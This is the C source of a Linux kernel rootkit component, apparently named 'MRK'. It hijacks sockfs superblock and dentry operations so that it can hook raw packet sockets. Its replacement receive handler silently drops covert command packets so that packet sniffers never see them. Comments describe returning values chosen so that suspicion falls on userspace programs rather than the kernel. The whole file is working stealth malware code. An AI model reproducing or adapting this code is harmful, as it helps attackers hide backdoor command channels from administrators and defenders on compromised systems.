#include <linux/net.h>
#include <linux/netdevice.h>
#include <net/sock.h>
#include <linux/workqueue.h>
#include <linux/fs.h>
#include <linux/list.h>
#include <linux/hashtable.h>

#include "headers/networking.h"
#include "headers/packet_headers/internal.h"

struct hooked_socket_entry {
    struct hlist_node node;
    struct socket *sock;
    const struct proto_ops *original_packet_ops;
    int (*original_packet_rcv)(struct sk_buff *skb, struct net_device *dev,
		                       struct packet_type *pt, struct net_device *orig_dev);
};

void hook_packet_sock(struct socket *sock);
struct hooked_socket_entry *get_socket_hook(struct socket *sock);
struct hooked_socket_entry *get_socket_hook_by_prot_hook(struct packet_type *pt);

static DEFINE_SPINLOCK(hook_packet_lock);

static int hooked_packet_setsockopt(struct socket *sock, int level, int optname,
		                            char __user *optval, unsigned int optlen)
{
    int result;
    unsigned long _flags;
    struct hooked_socket_entry *sock_hook = get_socket_hook(sock);

    // This case shouldn't happen, but if it does, the userspace program is likely to break.
    // Returning 0 means the syscall will not be very suspicious without heavy debugging, 
    // the immidiete suspect will be the userspace program, instead of the kernel.
    // TODO: Add a panic method that will remove the rootkit if this happends.
    if (!sock_hook) return 0;

    result = sock_hook->original_packet_ops->setsockopt(sock, level, optname, optval, optlen);
    spin_lock_irqsave(&hook_packet_lock, _flags);
    hook_packet_sock(sock);
	spin_unlock_irqrestore(&hook_packet_lock, _flags);
    return result;
}

static int hooked_packet_rcv(struct sk_buff *skb, struct net_device *dev,
		      struct packet_type *pt, struct net_device *orig_dev)
{
    struct hooked_socket_entry *sock_hook = get_socket_hook_by_prot_hook(pt);

    if (is_skb_cmd(skb)) {
        kfree_skb(skb);
        return 0;
    }

    // This case shouldn't happen, but if it does, the userspace program is likely to break.
    // Returning 0 means the syscall will not be very suspicious without heavy debugging, 
    // the immidiete suspect will be the userspace program, instead of the kernel.
    // TODO: Add a panic method that will remove the rootkit if this happends.
    if (!sock_hook) return 0;

    return sock_hook->original_packet_rcv(skb, dev, pt, orig_dev);
}

static DEFINE_HASHTABLE(hooked_sockets, 8);
static DEFINE_HASHTABLE(hooked_sockets_by_prot_hook, 8);

struct hooked_socket_entry *get_socket_hook(struct socket *sock) {
    struct hooked_socket_entry *sock_hook;

    hash_for_each_possible(hooked_sockets, sock_hook, node, (uintptr_t)sock) {
        if (sock_hook->sock == sock) return sock_hook;
    }
    return 0;
}

struct hooked_socket_entry *get_socket_hook_by_prot_hook(struct packet_type *pt) {
    struct hooked_socket_entry *sock_hook;

    hash_for_each_possible(hooked_sockets_by_prot_hook, sock_hook, node, (uintptr_t)pt) {
        if (&pkt_sk(sock_hook->sock->sk)->prot_hook == pt) return sock_hook;
    }
    return 0;
}

struct hooked_socket_entry *get_or_create_socket_hook(struct socket *sock, struct proto_ops **hooked_ops) {
    struct packet_sock *po = pkt_sk(sock->sk);
    struct hooked_socket_entry *sock_hook;

    if ((sock_hook = get_socket_hook(sock))) {
        *hooked_ops = (struct proto_ops *)sock->ops;
        return sock_hook;
    }

    sock_hook = kmalloc(sizeof(struct hooked_socket_entry), GFP_KERNEL);

    sock_hook->sock = sock;
    sock_hook->original_packet_ops = sock->ops;
    sock_hook->original_packet_rcv = po->prot_hook.func;
    
    *hooked_ops = kmalloc(sizeof(struct proto_ops), GFP_KERNEL);
    memcpy(*hooked_ops, sock_hook->original_packet_ops, sizeof(struct proto_ops));
    sock->ops = *hooked_ops;

    hash_add(hooked_sockets, &sock_hook->node, (uintptr_t)sock);
    hash_add(hooked_sockets_by_prot_hook, &sock_hook->node, (uintptr_t)(&pkt_sk(sock->sk)->prot_hook));
    return sock_hook;
}

void hook_packet_sock(struct socket *sock) {
    struct proto_ops *hooked_ops;
    get_or_create_socket_hook(sock, &hooked_ops);

    hooked_ops->setsockopt = hooked_packet_setsockopt;
    pkt_sk(sock->sk)->prot_hook.func = hooked_packet_rcv;
}

int is_packet_sock(struct socket *sock) {
    if (!sock->sk) return 0;
    return sock->sk->sk_family == PF_PACKET;
}

int my_wake_up(struct wait_queue_entry *wq_entry, unsigned mode, int flags, void *key) {
    // struct sk_buff *skb;
    unsigned long _flags;
    struct socket *sock = (struct socket *)wq_entry->private;
    
    if (is_packet_sock(sock)) {
        spin_lock_irqsave(&hook_packet_lock, _flags);
        hook_packet_sock(sock);
	    spin_unlock_irqrestore(&hook_packet_lock, _flags);
        // skb_queue_walk(&sock->sk->sk_receive_queue, skb) {
        //     printk(KERN_INFO "packet socket has buffer!\n");

        // }
    } else {
        list_del_init(&wq_entry->entry);
    }
    return 0;
}

struct unhooked_socket_entry {
    struct list_head head;
    struct socket *sock;
};

static LIST_HEAD(unhooked_sockets);

static struct inode *(*original_alloc_inode)(struct super_block *sb);

static struct inode *new_alloc_inode(struct super_block *sb) {
    struct inode *res;
    struct socket *sock;
    struct wait_queue_entry *wq;
    struct unhooked_socket_entry *s_entry;

    res = original_alloc_inode(sb);
    sock = SOCKET_I(res);

    /* Add wait queue entry */
    wq = kmalloc(sizeof(struct wait_queue_entry), GFP_KERNEL);
    init_waitqueue_func_entry(wq, &my_wake_up);
    wq->private = sock;
    add_wait_queue(&sock->wq.wait, wq);

    /* Add to unhooked queue */
    s_entry = kmalloc(sizeof(struct unhooked_socket_entry), GFP_KERNEL);
    s_entry->sock = sock;
    list_add_tail(&s_entry->head, &unhooked_sockets);

    return res;
}

static DEFINE_SPINLOCK(unhooked_sockets_lock);

static int my_d_init(struct dentry *dentry)
{
    struct unhooked_socket_entry *s_entry;
    struct unhooked_socket_entry *temp;
    unsigned long flags;
    unsigned long flags2;

    /* Handle unhooked queue */
    spin_lock_irqsave(&unhooked_sockets_lock, flags2);
	list_for_each_entry_safe(s_entry, temp, &unhooked_sockets, head) {
        // TODO: Only do this if the socket is ready to patch (it has ops and recv function.)
        spin_lock_irqsave(&hook_packet_lock, flags);
        if (is_packet_sock(s_entry->sock)) {
            hook_packet_sock(s_entry->sock);
        }
        list_del(&s_entry->head);
        kfree(s_entry);
        spin_unlock_irqrestore(&hook_packet_lock, flags);
    }
    spin_unlock_irqrestore(&unhooked_sockets_lock, flags2);
	return 0;
}

int MRK_init_sockets_hook(void) {
    struct file_system_type *fs_type;
    struct super_block *super;
    struct super_operations *s_op;
    struct dentry_operations *s_d_op;

    hash_init(hooked_sockets);
    hash_init(hooked_sockets_by_prot_hook);

    fs_type = get_fs_type("sockfs");

    hlist_for_each_entry(super, &fs_type->fs_supers, s_instances) {
        s_op = (struct super_operations *)kmalloc(sizeof(struct super_operations), GFP_KERNEL);
        memcpy(s_op, super->s_op, sizeof(struct super_operations));
        super->s_op = s_op;
        original_alloc_inode = s_op->alloc_inode;
        s_op->alloc_inode = &new_alloc_inode;

        s_d_op = (struct dentry_operations *)kmalloc(sizeof(struct dentry_operations), GFP_KERNEL);
        memcpy(s_d_op, super->s_d_op, sizeof(struct dentry_operations));
        super->s_d_op = s_d_op;
        
        s_d_op->d_init = &my_d_init;
    }
    return 0;
}

void MRK_exit_sockets_hook(void) {
}
